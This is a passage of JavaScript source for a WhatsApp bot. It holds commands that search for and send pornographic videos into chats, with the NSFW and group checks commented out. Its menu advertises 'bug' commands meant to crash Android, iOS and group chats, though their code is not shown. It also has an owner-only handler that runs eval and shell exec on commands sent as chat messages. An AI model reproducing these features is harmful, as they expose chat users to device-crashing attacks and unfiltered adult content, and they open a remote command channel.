        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: Avishka.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Avishka.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcAvi('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AMedia/donate.jpg')}, { upload: Avishka.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Avishka.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygcAvi('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
//  if (!m.isGroup) return XeonStickGroup()
//	if (!AntiNsfw) return replygcAvi(mess.nsfw)
  if (!text)
    return replygcAvi(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: Avishka.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Avishka.relayMessage(m.chat, msgs.message, {})
        Avishka.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcAvi('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcAvi('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AMedia/donate.jpg')}, { upload: Avishka.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: Avishka.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Avishka.relayMessage(m.chat, msgs.message, {})
      } else {
        replygcAvi('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcAvi('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
break

//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════

            //funny message
case 'gm': 
case'good morning':
await sendReaction('⏳');
Aviimun('*GOOD MORNING 😊 HAVE A NICE DAY 😙*')   
await sendReaction('✔');
break

case 'gn':
    case  'good night':
        await sendReaction('⏳');
Aviimun('*GOOD NIGHT 🥱 SWEET DREAMS 😴*') 
await sendReaction('✔');
break

case 'mk': 
await sendReaction('⏳');
Aviimun('*මුකුත් විශේෂ දෙයක් කරන්නැ* \n *ඔයා මොකද කරන්නේ?*')  
await sendReaction('✔');
break

case 'hutto':
    case'huththo':  
    await sendReaction('⏳');
Aviimun('*කුණු හරුප තහනම් 🤬*')    
await sendReaction('✔');
break
            //  Avile message
            
            case 'alive':
                await sendReaction('⏳');
                Avishka.sendMessage(m.chat, {
                    text: `*Hellow ${pushname}* \n *Im Alive Now* \n *Type Menu for my command list*`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @Avishka Shavinda`,
                            thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            
            
            case 'menu':
            case 'help':
            case 'avi':
            case '?':
            case 'allmenu':
                await sendReaction('⏳');
                let avimenuoh = `Hello ${pushname}
╰┈▢ ${avitimewisher} 🗡

╰┈▢ Avi comands
▢ alive
▢ developer
▢ owner
${readmore}

╰┈▢ auto messages

▢ gm
▢ gn
▢ mk

╰┈▢ ᴅᴏᴡɴ ᴍᴇɴᴜ

▢ play
▢ ytmp3
▢ ytmp4
▢ fb
▢ facebook
▢ sound1 - sound161

╰┈▢ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
▢ android 
▢ android2
▢ systemuicrash
▢ sysui

╰┈▢ ʙᴜɢ ɪᴏꜱ
▢ ios
▢ ios2

╰┈▢ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
▢ gcrash
▢ grpcrash

╰┈▢ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
▢ getsession
▢ deletesession
▢ join
▢ shutdown  
▢ restart
▢ autoread *[option]*
▢ autotyping *[option]*
▢ autorecording *[option]*
▢ autorecordtyp *[option]*
▢ autobio *[option]*
▢ autoswview *[option]*
▢ mode *[option]*
▢ block
▢ unblock 
▢ backup
▢ getcase
▢ addowner
▢ delowner

╰┈▢ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
▢ closetime
▢ opentime
▢ kick
▢ add
▢ promote
▢ demote
▢ setdesc
▢ setppgc
▢ tagall
▢ hidetag
▢ totag
▢ group *[option]*
▢ editinfo
▢ linkgc
▢ revoke
▢ listonline

╰┈▢ ᴍᴀɪɴ ᴍᴇɴᴜ
▢ menu
▢ buypremium
▢ runtime
▢ script
▢ donate
▢ owner

╰┈▢ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
▢ sticker
▢ smeme
▢ take
▢ toimage
▢ tovideo
▢ toaudio
▢ tomp3
▢ tovn
▢ togif
▢ tourl
▢ toqr
▢ toviewonce
▢ fliptext
▢ emojimix


╰┈▢ STICKER MENU

▢ cry
▢ kill
▢ hug 
▢ pat  
▢ lick 
▢ kiss 
▢ bite  
▢ yeet  
▢ neko 
▢ bully 
▢ bonk  
▢ wink 
▢ poke  
▢ nom 
▢ slap
▢ smile  
▢ wave  
▢ awoo  
▢ blush  
▢ smug  
▢ glomp  
▢ happy  
▢ dance  
▢ cringe 
▢ cuddle
▢ highfive  
▢ shinobu  
▢ megumin 
▢ handhold
prefa

╰┈▢ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ

▢ addvideo
▢ addimage
▢ addsticker
▢ addvn
▢ addzip
▢ addapk
▢ addpdf
▢ delvideo
▢ delimage
▢ delsticker
▢ delvn
▢ delzip
▢ delapk
▢ delpdf
▢ listvideo
▢ listimage
▢ liststicker
▢ listvn
▢ listzip
▢ listapk
▢ listpdf `
if (typemenu === 'v1') {
                    Avishka.sendMessage(m.chat, {
                        text: avimenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    Avishka.sendMessage(m.chat, {
      video: fs.readFileSync('./AMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: avimenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    Avishka.sendMessage(m.chat, {
                        video: fs.readFileSync('./AMedia/thumb2.mp4'),
                        caption: avimenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    Avishka.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: avimenuoh
                        }
                    }, {})
                }
                await sendReaction('✔');
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcAvi(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcAvi(bang)
                    }
                    try {
                        replygcAvi(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcAvi(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcAvi(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcAvi(evaled)
                    } catch (err) {
                        await replygcAvi(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcAvi(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcAvi(err)
                        if (stdout) return replygcAvi(stdout)
                    })
                }
        }
    } catch (err) {
        Avishka.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})